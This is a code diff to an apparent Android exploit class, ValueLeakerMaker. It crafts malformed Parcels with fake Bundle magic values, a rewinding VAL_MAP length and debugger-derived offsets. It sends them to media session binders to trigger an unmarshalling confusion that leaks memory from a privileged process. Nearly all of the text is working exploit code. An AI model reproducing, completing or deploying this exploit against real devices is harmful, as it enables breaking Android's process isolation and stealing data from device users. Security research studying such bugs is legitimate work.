@@ -204,26 +204,11 @@ public class ValueLeakerMaker {
         }
 
         IBinder setQueueBinder = (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionBinder);
-        {
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            data.writeInt(2); // List length
-            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
-            data.writeString("android.os.Message");
-            Message message = Message.obtain();
-            message.obj = new ComponentName(FILLER_PACKAGE_NAME_HALF, "");
-            message.writeToParcel(data, 0);
-			message.recycle();
-            data.writeInt(0); // ParcelableListBinder.END_OF_PARCEL
-            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
-            reply.recycle();
-            data.recycle();
-        }
-
         int offsetToLeakedData;
         {
             Parcel data = Parcel.obtain();
             Parcel reply = Parcel.obtain();
+            data.writeInt(1); // List length
             data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
             data.writeString("android.os.Message");
             data.writeInt(4); // msg.what / readValue() type
@@ -253,12 +238,15 @@ public class ValueLeakerMaker {
             data.writeInt(4); // Bundle length (ignored as actual length due to read helper presence)
             data.writeInt(0x4C444E44); // BUNDLE_MAGIC_NATIVE
             data.writeInt(2); // Number of key-value pairs in Bundle
-            offsetToLeakedData = data.dataPosition(); // TODO
+            offsetToLeakedData = data.dataPosition() + 52; // Just grabbed offset from debugger without thinking
 
             // BEGIN First Bundle key-value pair
             data.writeString("%$#@!");
             data.writeInt(2); // VAL_MAP
-            data.writeInt(-data.dataPosition());
+            // Without adjustment here, reading of subsequent value in Bundle will fail with
+            // Unmarshalling unknown type code 7209057 at offset 12
+            // type code is chars "an" from "android.os.Message"
+            data.writeInt(-data.dataPosition() + 4);
             data.writeInt(0); // Number of items in VAL_MAP
             // END First Bundle key-value pair
             // Reader has rewound, abandon writing
@@ -268,25 +256,7 @@ public class ValueLeakerMaker {
             data.recycle();
         }
 
-        IBinder retriever;
-        {
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            data.writeInterfaceToken("android.media.session.ISessionController");
-            mControllerBinder.transact(mGetQueueCode, data, reply, 0);
-            reply.readException();
-            readIntAndCheck(reply, 1, "PLS != null");
-            readIntAndCheck(reply, 2, "PLS.size()");
-            readStringAndCheck(reply, "android.os.Message", "PLS item type");
-            readIntAndCheck(reply, 1, "First item presence");
-            Message.CREATOR.createFromParcel(reply).recycle();
-            readIntAndCheck(reply, 0, "Second item presence");
-            retriever = reply.readStrongBinder();
-            reply.recycle();
-            data.recycle();
-        }
-
-        return new ValueLeaker(retriever, offsetToLeakedData, leakDataSize, 0x40002300240025L);
+        return new ValueLeaker(mControllerBinder, offsetToLeakedData, leakDataSize, 0x40002300240025L, mGetQueueCode);
     }
 
     /**
